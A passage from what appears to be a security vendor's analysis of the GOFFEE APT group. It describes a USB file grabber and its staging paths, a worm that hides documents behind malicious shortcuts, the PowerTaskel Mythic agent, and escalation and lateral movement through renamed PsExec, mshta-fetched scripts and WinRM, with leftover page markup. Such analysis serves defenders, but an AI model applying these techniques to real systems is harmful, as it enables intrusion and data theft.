https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08140504/goffee-apt-new-attacks-EN10-740x543.png 740w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08140504/goffee-apt-new-attacks-EN10-381x280.png 381w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08140504/goffee-apt-new-attacks-EN10-800x587.png 800w" sizes="auto, (max-width: 971px) 100vw, 971px" /></a><p id="caption-attachment-116150" class="wp-caption-text">FlashFileGrabberOffline main routine</p></div>
<p>FlashFileGrabberOffline searches removable media for files with specific extensions, and when found, copies them to the local disk. To accomplish this, it creates a series of subdirectories in the TEMP folder, following the template &#8220;%TEMP%\CacheStore\connect\&lt;VolumeSerialNumber&gt;\&#8221;. The folder names &#8220;CacheStore&#8221; and &#8220;connect&#8221; are hardcoded within the script. Examples of such paths are provided below:</p>
		<div id="crayon-67fada0777674873923711" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-mixed-highlight" title="Contains Mixed Languages"></span><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
%TEMP%\CacheStore\connect\62431103\2024\some.pdf
%TEMP%\CacheStore\connect\62431103\Documents\some.docx
%TEMP%\CacheStore\connect\62431103\attachment.jpg
%TEMP%\CacheStore\connect\6c1d1372\Print\resume.docx</textarea></div>

class="crayon-i">connect</span><span class="crayon-sy">\</span><span class="crayon-cn">62431103</span><span class="crayon-sy">\</span><span class="crayon-i">attachment</span><span class="crayon-sy">.</span><span class="crayon-i">jpg</span></div><div class="crayon-line crayon-striped-line" id="crayon-67fada0777674873923711-6">&nbsp;</div><div class="crayon-line" class="crayon-i">CacheStore</span><span class="crayon-sy">\</span><span class="crayon-i">connect</span><span class="crayon-sy">\</span><span class="crayon-cn">6c1d1372</span><span class="crayon-sy">\</span><span class="crayon-i">Print</span><span class="crayon-sy">\</span><span class="crayon-i">resume</span><span class="crayon-sy">.</span><span class="crayon-i">docx</span></div></div></td>
					</tr>
				</table>
			</div>
		</div><p>
Additionally, a file named &#8220;ftree.db&#8221; is created at the path specified in the template, which stores metadata for the copied files, including the full path to the original file, its size, and dates of last access and modification. Furthermore, in the &#8220;%AppData%&#8221; folder, the &#8220;internal_profiles.db&#8221; file is created, storing the MD5 sums of the aforementioned metadata. This allows the malware to avoid copying the same files more than once:</p>
		<div id="crayon-67fada0777675034904973" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-mixed-highlight" title="Contains Mixed Languages"></span><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
%TEMP%\CacheStore\connect\&lt;VolumeSerialNumber&gt;\ftree.db
%AppData%\internal_profiles.db</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-67fada0777675034904973-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-67fada0777675034904973-2">2</div><div class="crayon-num" data-line="crayon-67fada0777675034904973-3">3</div></div>
				</td>

</table>
<p>FlashFileGrabber largely duplicates the functionality of FlashFileGrabberOffline, but with one key difference: it is capable of sending files to the C2 server.</p>
<div id="attachment_116151" style="width: 958px" class="wp-caption aligncenter"><a href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08141110/goffee-apt-new-attacks-EN11.png" class="magnificImage"><img loading="lazy" decoding="async" aria-describedby="caption-attachment-116151" class="size-full wp-image-116151" src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08141110/goffee-apt-new-attacks-EN11.png" alt="FlashFileGrabber's routines" width="948" height="843" srcset="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08141110/goffee-apt-new-attacks-EN11.png 948w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08141110/goffee-apt-new-attacks-EN11-300x267.png 300w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08141110/goffee-apt-new-attacks-EN11-768x683.png 768w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08141110/goffee-apt-new-attacks-EN11-394x350.png 394w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08141110/goffee-apt-new-attacks-EN11-740x658.png 740w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08141110/goffee-apt-new-attacks-EN11-315x280.png 315w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08141110/goffee-apt-new-attacks-EN11-800x711.png 800w" sizes="auto, (max-width: 948px) 100vw, 948px" /></a><p id="caption-attachment-116151" class="wp-caption-text">FlashFileGrabber&#8217;s routines</p></div>
<h3 id="usb-worm">USB Worm</h3>
<p>USB Worm is capable of infecting removable media with a copy of PowerModul. To achieve this, the worm renames the files on the removable disk with a random name, retaining their original extension, and assigns them the &#8220;Hidden&#8221; file attribute. The &#8220;UserCache.ini&#8221; file, which contains PowerModul, is then copied to the folder with the original file.</p>
<div id="attachment_116152" style="width: 1153px" class="wp-caption aligncenter"><a href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08141301/goffee-apt-new-attacks-EN12.png" class="magnificImage"><img loading="lazy" decoding="async" aria-describedby="caption-attachment-116152" class="size-full wp-image-116152" src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08141301/goffee-apt-new-attacks-EN12.png" alt="USB Worm main routine" width="1143" height="565" srcset="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08141301/goffee-apt-new-attacks-EN12.png 1143w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08141301/goffee-apt-new-attacks-EN12-300x148.png 300w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08141301/goffee-apt-new-attacks-EN12-1024x506.png 1024w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08141301/goffee-apt-new-attacks-EN12-768x380.png 768w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08141301/goffee-apt-new-attacks-EN12-708x350.png 708w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08141301/goffee-apt-new-attacks-EN12-740x366.png 740w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08141301/goffee-apt-new-attacks-EN12-566x280.png 566w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08141301/goffee-apt-new-attacks-EN12-800x395.png 800w" sizes="auto, (max-width: 1143px) 100vw, 1143px" /></a><p id="caption-attachment-116152" class="wp-caption-text">USB Worm main routine</p></div>
<p>Additionally, the worm creates hidden VBS and batch files to launch PowerModul and open a decoy document.</p>
<div id="attachment_116153" style="width: 1120px" class="wp-caption aligncenter"><a href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08141356/goffee-apt-new-attacks-EN13.png" class="magnificImage"><img loading="lazy" decoding="async" aria-describedby="caption-attachment-116153" class="size-full wp-image-116153" src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08141356/goffee-apt-new-attacks-EN13.png" alt="CreateVBSFile() and CreateBatFile() functions" width="1110" height="450" srcset="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08141356/goffee-apt-new-attacks-EN13.png 1110w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08141356/goffee-apt-new-attacks-EN13-300x122.png 300w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08141356/goffee-apt-new-attacks-EN13-1024x415.png 1024w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08141356/goffee-apt-new-attacks-EN13-768x311.png 768w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08141356/goffee-apt-new-attacks-EN13-990x400.png 990w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08141356/goffee-apt-new-attacks-EN13-863x350.png 863w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08141356/goffee-apt-new-attacks-EN13-740x300.png 740w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08141356/goffee-apt-new-attacks-EN13-691x280.png 691w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08141356/goffee-apt-new-attacks-EN13-800x324.png 800w" sizes="auto, (max-width: 1110px) 100vw, 1110px" /></a><p id="caption-attachment-116153" class="wp-caption-text">CreateVBSFile() and CreateBatFile() functions</p></div>

<p align="center"><strong><em>Example of the contents of a malicious VBS</em></strong></p>

		<div id="crayon-67fada0777678151841222" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">

<p align="center"><strong><em>Example of the contents of a malicious batch file</em></strong></p>
<p>A shortcut is also created with the original name of the decoy document, which, when launched, executes the VBS file.</p>
<div id="attachment_116154" style="width: 1110px" class="wp-caption aligncenter"><a href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08141609/goffee-apt-new-attacks-EN14.png" class="magnificImage"><img loading="lazy" decoding="async" aria-describedby="caption-attachment-116154" class="size-full wp-image-116154" src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08141609/goffee-apt-new-attacks-EN14.png" alt="CreateShortcutForFile() function" width="1100" height="875" srcset="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08141609/goffee-apt-new-attacks-EN14.png 1100w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08141609/goffee-apt-new-attacks-EN14-300x239.png 300w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08141609/goffee-apt-new-attacks-EN14-1024x815.png 1024w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08141609/goffee-apt-new-attacks-EN14-768x611.png 768w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08141609/goffee-apt-new-attacks-EN14-440x350.png 440w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08141609/goffee-apt-new-attacks-EN14-740x589.png 740w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08141609/goffee-apt-new-attacks-EN14-352x280.png 352w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08141609/goffee-apt-new-attacks-EN14-800x636.png 800w" sizes="auto, (max-width: 1100px) 100vw, 1100px" /></a><p id="caption-attachment-116154" class="wp-caption-text">CreateShortcutForFile() function</p></div>
<p>To disguise the shortcut, the worm assigns an icon from the shell32.dll library, depending on the extension of the original file. The worm limits the number of documents replaced with shortcuts to five, selecting only the most recently accessed files by sorting them according to their LastAccessTime attribute.</p>
<div id="attachment_116155" style="width: 616px" class="wp-caption aligncenter"><a href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08141742/goffee-apt-new-attacks-EN15.png" class="magnificImage"><img loading="lazy" decoding="async" aria-describedby="caption-attachment-116155" class="size-full wp-image-116155" src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08141742/goffee-apt-new-attacks-EN15.png" alt="System infection scheme via removable media" width="606" height="329" srcset="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08141742/goffee-apt-new-attacks-EN15.png 606w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08141742/goffee-apt-new-attacks-EN15-300x163.png 300w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08141742/goffee-apt-new-attacks-EN15-516x280.png 516w" sizes="auto, (max-width: 606px) 100vw, 606px" /></a><p id="caption-attachment-116155" class="wp-caption-text">System infection scheme via removable media</p></div>
<h3 id="powertaskel">PowerTaskel</h3>
<p>We have dubbed the non-public PowerShell Mythic agent delivered via a mail-based infection chain since early 2023, as PowerTaskel. This implant possesses only two primary capabilities: sending information about the targeted environment to a C2 server in the form of a &#8220;checkin&#8221; message, and executing arbitrary PowerShell scripts and commands received from the C2 server as &#8220;tasks&#8221; in response to &#8220;get_tasking&#8221; requests from the implant. The request payloads are PowerShell objects that are serialized to XML, encoded using XOR with a sample-specific 1-byte key, and then converted to Base64.</p>
<p>Based on the naming and ordering of the configuration parameters, it is likely that PowerTaskel is derived from the open-source Medusa Mythic agent, which was originally written in Python.</p>
<div id="attachment_116156" style="width: 772px" class="wp-caption aligncenter"><a href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08141849/goffee-apt-new-attacks-EN16.png" class="magnificImage"><img loading="lazy" decoding="async" aria-describedby="caption-attachment-116156" class="size-full wp-image-116156" src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08141849/goffee-apt-new-attacks-EN16.png" alt="Comparison of Medusa and PowerTaskel configuration code" width="762" height="284" srcset="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08141849/goffee-apt-new-attacks-EN16.png 762w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08141849/goffee-apt-new-attacks-EN16-300x112.png 300w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08141849/goffee-apt-new-attacks-EN16-740x276.png 740w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08141849/goffee-apt-new-attacks-EN16-751x280.png 751w" sizes="auto, (max-width: 762px) 100vw, 762px" /></a><p id="caption-attachment-116156" class="wp-caption-text">Comparison of Medusa and PowerTaskel configuration code</p></div>
<div id="attachment_116157" style="width: 1030px" class="wp-caption aligncenter"><a href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08141928/goffee-apt-new-attacks-EN17.png" class="magnificImage"><img loading="lazy" decoding="async" aria-describedby="caption-attachment-116157" class="size-full wp-image-116157" src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08141928/goffee-apt-new-attacks-EN17.png" width="1020" height="184" srcset="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08141928/goffee-apt-new-attacks-EN17.png 1020w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08141928/goffee-apt-new-attacks-EN17-300x54.png 300w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08141928/goffee-apt-new-attacks-EN17-768x139.png 768w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08141928/goffee-apt-new-attacks-EN17-740x133.png 740w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08141928/goffee-apt-new-attacks-EN17-800x144.png 800w" sizes="auto, (max-width: 1020px) 100vw, 1020px" /></a><p id="caption-attachment-116157" class="wp-caption-text">Comparison of Medusa and PowerTaskel &#8220;checkin&#8221; function code</p></div>
<p>PowerTaskel is a fully functional agent capable of executing commands and PowerShell scripts, which expand its capabilities to downloading and uploading files, running processes, etc. However, its functionality is often insufficient due to specific aspects of PowerShell usage, prompting the group to switch to a custom binary Mythic agent. To achieve this, PowerTaskel loads the Mythic agent from the C2 server, injects it into its own process memory, and runs it in a separate thread. In this scenario, the Mythic agent is present as a self-configuring x32/x64 shellcode. The method of injecting and loading the Mythic agent shellcode is described in more detail in the &#8220;Lateral Movement&#8221; section.</p>
<p>In at least one instance, PowerTaskel received a script containing a FolderFileGrabber component as a task. FolderFileGrabber largely replicates the functionality of FlashFileGrabber, with one key difference: it can grab files from remote systems via a hardcoded network path using the SMB protocol. The PowerShell cmdlet &#8220;New-SmbMapping&#8221; is used to access remote system resources, enabling successful retrieval of the desired files.</p>
<h3 id="lateral-movement">Lateral movement</h3>
<p>Following system infection, if the user account permissions allow it, PowerTaskel performs several tasks to elevate its privileges to the System level. To achieve this, PowerTaskel utilizes the PsExec utility, which is part of the Sysinternals suite. The PsExec utility is dropped into the current directory where PowerTaskel is located and is used to execute mshta.exe with system privileges, passing a URL as an argument.</p>
<p>The images below depict two tasks that PowerTaskel executes with its C2 server. The first task checks for the presence of the file &#8220;ntuser.exe&#8221; in the %ProgramData% directory, and if it is not found, downloads it from the C2 server. The second task runs mshta.exe via ntuser.exe, which is actually a renamed PsExec utility.</p>
<div id="attachment_116158" style="width: 869px" class="wp-caption aligncenter"><a href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08142510/goffee-apt-new-attacks-EN18.png" class="magnificImage"><img loading="lazy" decoding="async" aria-describedby="caption-attachment-116158" class="size-full wp-image-116158" src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08142510/goffee-apt-new-attacks-EN18.png" width="859" height="829" srcset="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08142510/goffee-apt-new-attacks-EN18.png 859w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08142510/goffee-apt-new-attacks-EN18-300x290.png 300w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08142510/goffee-apt-new-attacks-EN18-768x741.png 768w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08142510/goffee-apt-new-attacks-EN18-363x350.png 363w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08142510/goffee-apt-new-attacks-EN18-740x714.png 740w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08142510/goffee-apt-new-attacks-EN18-290x280.png 290w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08142510/goffee-apt-new-attacks-EN18-800x772.png 800w" sizes="auto, (max-width: 859px) 100vw, 859px" /></a><p id="caption-attachment-116158" class="wp-caption-text">Getting &#8220;ntuser.exe&#8221;</p></div>
<div id="attachment_116159" style="width: 951px" class="wp-caption aligncenter"><a href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08142557/goffee-apt-new-attacks-EN19.png" class="magnificImage"><img loading="lazy" decoding="async" aria-describedby="caption-attachment-116159" class="size-full wp-image-116159" src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08142557/goffee-apt-new-attacks-EN19.png" width="941" height="287" srcset="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08142557/goffee-apt-new-attacks-EN19.png 941w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08142557/goffee-apt-new-attacks-EN19-300x91.png 300w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08142557/goffee-apt-new-attacks-EN19-768x234.png 768w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08142557/goffee-apt-new-attacks-EN19-740x226.png 740w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08142557/goffee-apt-new-attacks-EN19-918x280.png 918w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08142557/goffee-apt-new-attacks-EN19-800x244.png 800w" sizes="auto, (max-width: 941px) 100vw, 941px" /></a><p id="caption-attachment-116159" class="wp-caption-text">The &#8220;ntuser.exe&#8221; executable running &#8220;mshta.exe&#8221;</p></div>
<p>The next image illustrates an example of the execution flow of various scripts and commands started with the privilege elevation procedure. The executable file &#8220;1cv9.exe&#8221; is a renamed PsExec utility, and the argument &#8220;-s&#8221; specifies that the process it launches should run under the System account. The launched program &#8220;mshta.exe&#8221; accepts a URL as an argument, which points to an HTA file containing malicious, obfuscated JScript. The HTA file is cached and saved to the InetCache folder. This JScript creates two files, &#8220;desktop.js&#8221; and &#8220;user.txt&#8221;, on the disk using the &#8220;echo&#8221; console command with output redirection to a file, and then executes desktop.js via cscript.exe. The desktop.js file, in turn, launches the interpreter with a script on the command line, which reads the contents of user.txt and executes it. As evident from the contents passed to the &#8220;echo&#8221; command, user.txt is another PowerShell script whose task is to extract a payload from a hardcoded address and execute it. In this case, the payload is PowerTaskel, which now runs with the elevated privileges.</p>
<div id="attachment_116160" style="width: 889px" class="wp-caption aligncenter"><a href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08143135/goffee-apt-new-attacks-EN20.png" class="magnificImage"><img loading="lazy" decoding="async" aria-describedby="caption-attachment-116160" class="size-full wp-image-116160" src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08143135/goffee-apt-new-attacks-EN20.png" alt="Example of execution flow on an infected system" width="879" height="372" srcset="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08143135/goffee-apt-new-attacks-EN20.png 879w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08143135/goffee-apt-new-attacks-EN20-300x127.png 300w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08143135/goffee-apt-new-attacks-EN20-768x325.png 768w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08143135/goffee-apt-new-attacks-EN20-827x350.png 827w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08143135/goffee-apt-new-attacks-EN20-740x313.png 740w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08143135/goffee-apt-new-attacks-EN20-662x280.png 662w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08143135/goffee-apt-new-attacks-EN20-800x339.png 800w" sizes="auto, (max-width: 879px) 100vw, 879px" /></a><p id="caption-attachment-116160" class="wp-caption-text">Example of execution flow on an infected system</p></div>
<p>Once launched, PowerTaskel interacts with its C2 server and executes standard commands to gather information about the system and environment. Notably, the launch of csc.exe (Visual C# Command Line Compiler) indicates that PowerTaskel has received a task to load a shellcode, which it accomplishes using an auxiliary DLL. The primary function of this DLL is to copy the shellcode into allocated memory. In our case, the shellcode is self-configuring code for the binary Mythic agent.</p>
<p>The final line of the execution flow (&#8220;hxxp://192.168.1[.]2:5985/wsman&#8221;) reveals a call to the WinRM (Microsoft Windows Remote Management) service, located on a remote host on the local network, via the loaded Mythic agent. A specific User-Agent header value, &#8220;Ruby WinRM Client&#8221;, is used to access the WinRM service.</p>
<div id="attachment_116161" style="width: 955px" class="wp-caption aligncenter"><a href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08143522/goffee-apt-new-attacks-EN21.png" class="magnificImage"><img loading="lazy" decoding="async" aria-describedby="caption-attachment-116161" class="size-full wp-image-116161" src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08143522/goffee-apt-new-attacks-EN21.png" alt="HTTP header for WinRM request" width="945" height="235" srcset="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08143522/goffee-apt-new-attacks-EN21.png 945w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08143522/goffee-apt-new-attacks-EN21-300x75.png 300w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08143522/goffee-apt-new-attacks-EN21-768x191.png 768w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08143522/goffee-apt-new-attacks-EN21-740x184.png 740w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08143522/goffee-apt-new-attacks-EN21-800x199.png 800w" sizes="auto, (max-width: 945px) 100vw, 945px" /></a><p id="caption-attachment-116161" class="wp-caption-text">HTTP header for WinRM request</p></div>
<p>The WinRM service is actively utilized by GOFFEE for network distribution purposes. Typically, this involves launching the mshta.exe utility on the remote host with a URL as an argument. The following examples illustrate the execution chains observed on remote hosts:</p>
